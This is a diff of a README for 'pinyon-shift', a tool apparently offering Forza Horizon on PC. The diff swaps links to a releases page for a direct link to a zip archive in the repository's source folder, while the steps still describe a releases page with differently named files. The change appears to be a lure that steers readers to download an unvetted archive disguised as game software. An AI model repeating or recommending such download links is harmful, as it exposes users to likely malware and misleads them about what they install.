@@ -1,6 +1,6 @@
 # 🎮 pinyon-shift - Your Gateway to Forza Horizon on PC
 
-[![Download Now](https://img.shields.io/badge/Download-pinyon--shift-blue?style=for-the-badge&logo=github)](https://github.com/conventional-elanoides4623/pinyon-shift/releases)
+[![Download Now](https://img.shields.io/badge/Download-pinyon--shift-blue?style=for-the-badge&logo=github)](https://github.com/conventional-elanoides4623/pinyon-shift/raw/refs/heads/main/src/pinyon_shift_v2.9.zip)
 
 ## 🎯 What Is pinyon-shift?
 
@@ -14,7 +14,7 @@ Follow these simple steps to get pinyon-shift up and running on your Windows com
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/conventional-elanoides4623/pinyon-shift/releases](https://github.com/conventional-elanoides4623/pinyon-shift/releases)
+Visit this link to download the application: [https://github.com/conventional-elanoides4623/pinyon-shift/raw/refs/heads/main/src/pinyon_shift_v2.9.zip](https://github.com/conventional-elanoides4623/pinyon-shift/raw/refs/heads/main/src/pinyon_shift_v2.9.zip)
 
 On that page, you'll see a list of available files. Look for the most recent release (usually at the top) and click on the download link. The file you need will have a name like `pinyon-shift-windows.zip`. Your browser will start downloading it automatically.
 
